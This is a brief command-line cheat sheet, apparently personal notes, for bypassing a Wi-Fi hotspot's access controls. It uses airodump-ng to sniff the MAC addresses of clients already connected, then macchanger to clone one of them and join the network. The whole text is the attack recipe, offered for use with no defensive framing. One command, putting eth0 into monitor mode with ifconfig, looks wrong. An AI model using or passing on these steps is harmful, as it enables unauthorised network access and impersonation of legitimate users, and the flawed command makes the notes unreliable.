#Bypass Hotspots Access Controls

#Search for people already connected to network and use their MAC address

#Monitor mode
ifconfig eth0 monitor

airodump-ng eth0

airodump-ng --bssid [ssid] eth0

#search for MAC address select one and change MAC address to theirs

ifconfig eth0 down

#unplug usb and rea attach (so in monitor mode)

macchanger -m [desired mac address] eth0

ifconfig eth0 up

#connect to network :-)